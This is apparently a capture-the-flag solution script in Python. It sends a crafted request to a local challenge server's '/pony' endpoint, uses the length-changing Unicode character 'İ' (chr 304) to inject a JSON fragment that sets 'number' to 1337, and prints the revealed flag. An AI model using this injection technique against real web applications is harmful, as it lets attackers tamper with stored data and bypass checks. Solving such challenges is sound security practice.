URL = 'http://localhost:1337'

import requests
s = requests.Session()
s.get(URL)
r = s.post(URL+'/pony', data={"name": "asdf", "bio": "asdf", "image": "asdf", "favorite_key": chr(304)*64, "favorite_value": '","number":1337,"":"'.ljust(64), "word": chr(304)*23+'_"}', "number": 0}).text
print(r[r.index("Favorite flag:"):r.index("}")+1])
